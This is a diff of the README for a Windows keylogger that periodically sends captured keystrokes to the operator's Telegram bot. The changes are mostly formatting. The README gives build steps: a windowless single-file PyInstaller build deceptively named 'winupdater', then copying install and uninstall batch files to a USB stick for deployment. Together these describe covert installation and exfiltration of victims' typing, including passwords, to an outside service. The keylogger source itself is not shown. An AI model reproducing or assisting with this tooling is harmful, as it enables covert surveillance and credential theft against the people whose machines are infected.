@@ -4,15 +4,15 @@
 
 ## 📦 Overview
 
-This is a monolithic version of a keylogger for **Windows** that periodically sends logged keystrokes to your **Telegram** chat using your own bot.
+- This is a monolithic version of a keylogger for **Windows** that periodically sends logged keystrokes to your **Telegram** chat using your own bot.
 
-Final build must be compiled on **Windows** using PyInstaller.
+- Final build must be compiled on **Windows** using PyInstaller.
 
 ---
 
 ## ⚙️ Configuration
 
-Open the `logger_bot.py` file and set the following values:
+- Open the `logger_bot.py` file and set the following values:
 
 ```python
 # ===== Configuration =====
@@ -55,19 +55,19 @@ pip install pyinstaller pynput python-telegram-bot psutil
 
 ### 3. Build the executable
 
-In the project folder, run:
+- In the project folder, run:
 
 ```cmd
 pyinstaller --noconsole --onefile --name winupdater logger_bot.py
 ```
 
-After successful build, your `.exe` file will appear in the `dist/` folder.
+- After successful build, your `.exe` file will appear in the `dist/` folder.
 
 ---
 
 ### 4. Copy to USB
 
-Copy the following 3 files to a USB stick:
+- Copy the following 3 files to a USB stick:
 
 - `install.bat`
 - `uninstall.bat`
@@ -84,14 +84,12 @@ Copy the following 3 files to a USB stick:
 
 ## 💡 Final Notes
 
-Creating a Telegram bot is easy — search for `@BotFather` in Telegram and follow the instructions.  
-This keylogger was built specifically for **Linux users building for Windows** and may require adjustments for non-standard environments.
+- Creating a Telegram bot is easy — search for `@BotFather` in Telegram and follow the instructions.  
+- This keylogger was built specifically for **Windows** and may require adjustments for non-standard environments.
 
 ---
 
 ## 🐧 Linux Note
 
-> You likely won’t be able to use this project directly unless you're on Linux, as I designed and prepared the build process specifically for Linux-based setups.
-
-That said — I **highly recommend** trying out Linux if you haven’t already 😉
+> That said — I **highly recommend** trying out Linux if you haven’t already 😉
 
